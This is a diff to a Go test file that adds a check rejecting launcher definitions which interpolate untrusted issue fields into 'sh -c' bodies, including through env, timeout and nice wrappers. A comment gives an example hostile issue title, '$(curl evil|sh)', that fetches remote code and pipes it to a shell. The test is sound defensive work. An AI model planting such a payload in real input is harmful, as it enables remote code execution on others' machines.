@@ -127,7 +127,9 @@ func TestServiceBuiltInDefinitionsForV1Actions(t *testing.T) {
 	service, err := launcher.NewService([]launcher.Definition{
 		{Action: "nvim", Command: "nvim", Args: []string{"[{{issue.id}}]", "{{issue.title}}"}},
 		{Action: "opencode", Command: "opencode", Args: []string{"run", "--issue", "{{issue.id}}", "--title", "{{issue.title}}"}},
-		{Action: "shell-command", Command: "sh", Args: []string{"-lc", "echo {{issue.id}}"}},
+		// Safe shell pattern: issue fields are positional args ($0, …), never
+		// interpolated into the -lc body (matches the real built-in definition).
+		{Action: "shell-command", Command: "sh", Args: []string{"-lc", "printf '%s\\n' \"$0\"", "{{issue.id}}"}},
 	}, "/repo/root", runner)
 	if err != nil {
 		t.Fatalf("NewService returned error: %v", err)
@@ -175,5 +177,55 @@ func TestNewServiceValidatesInputs(t *testing.T) {
 	_, err = launcher.NewService([]launcher.Definition{{Action: "editor", Command: "nvim"}}, "/repo/root", nil)
 	if err == nil {
 		t.Fatal("expected error for nil runner")
+	}
+}
+
+// TestNewServiceRejectsIssueFieldInShellBody asserts the shell-launcher security
+// invariant is enforced at construction: a definition that interpolates an
+// operator-untrusted issue field into a `sh -c`/`sh -lc` body is rejected,
+// because issue content (e.g. a title like `$(curl evil|sh)`) would be re-parsed
+// as code and executed (command injection / RCE via issue content).
+func TestNewServiceRejectsIssueFieldInShellBody(t *testing.T) {
+	t.Parallel()
+
+	unsafe := []launcher.Definition{
+		// Direct shell command with the issue field in the -c/-lc body.
+		{Action: "danger", Command: "sh", Args: []string{"-c", "grep {{issue.title}} log"}},
+		{Action: "danger", Command: "sh", Args: []string{"-lc", "echo {{issue.id}}"}},
+		{Action: "danger", Command: "sh", Args: []string{"-lic", "run {{issue.assignee}}"}},
+		// Separate -c flag after other shell options.
+		{Action: "danger", Command: "sh", Args: []string{"-l", "-c", "echo {{issue.labels}}"}},
+		// /bin/bash by absolute path (basename match).
+		{Action: "danger", Command: "/bin/bash", Args: []string{"-c", "echo {{issue.title}}"}},
+		// Exec wrappers fronting the shell must not bypass the guard (argv scan).
+		{Action: "danger", Command: "env", Args: []string{"sh", "-c", "echo {{issue.title}}"}},
+		{Action: "danger", Command: "/usr/bin/env", Args: []string{"bash", "-lc", "run {{issue.assignee}}"}},
+		{Action: "danger", Command: "timeout", Args: []string{"10", "sh", "-c", "grep {{issue.id}} log"}},
+		{Action: "danger", Command: "nice", Args: []string{"-n5", "sh", "-c", "echo {{issue.labels}}"}},
+	}
+	for _, def := range unsafe {
+		if _, err := launcher.NewService([]launcher.Definition{def}, "/repo/root", &fakes.FakeProcessRunner{}); err == nil {
+			t.Errorf("expected error for unsafe definition command=%q args=%v, got nil", def.Command, def.Args)
+		}
+	}
+
+	// Safe forms must be accepted: issue field as a positional arg, and a
+	// non-shell command whose args contain placeholders (no shell re-parsing).
+	safe := []launcher.Definition{
+		// Issue field as a positional arg ($0), not in the body.
+		{Action: "ok", Command: "sh", Args: []string{"-lc", "printf '%s' \"$0\"", "{{issue.title}}"}},
+		// Non-shell command whose args contain placeholders (no shell re-parsing).
+		{Action: "ok", Command: "grep", Args: []string{"{{issue.title}}", "log"}},
+		// Shell body with no issue placeholder.
+		{Action: "ok", Command: "sh", Args: []string{"-c", "ls"}},
+		// Exec wrapper + shell, but the issue field is a positional arg after the body.
+		{Action: "ok", Command: "env", Args: []string{"sh", "-lc", "printf '%s' \"$0\"", "{{issue.id}}"}},
+		// Issue field passed via env var (documented safe pattern, like opencode).
+		{Action: "ok", Command: "mytool", Args: []string{"--run"}, Env: []string{"ISSUE={{issue.title}}"}},
+	}
+	for _, def := range safe {
+		if _, err := launcher.NewService([]launcher.Definition{def}, "/repo/root", &fakes.FakeProcessRunner{}); err != nil {
+			t.Errorf("expected safe definition command=%q args=%v to be accepted, got error: %v", def.Command, def.Args, err)
+		}
 	}
 }
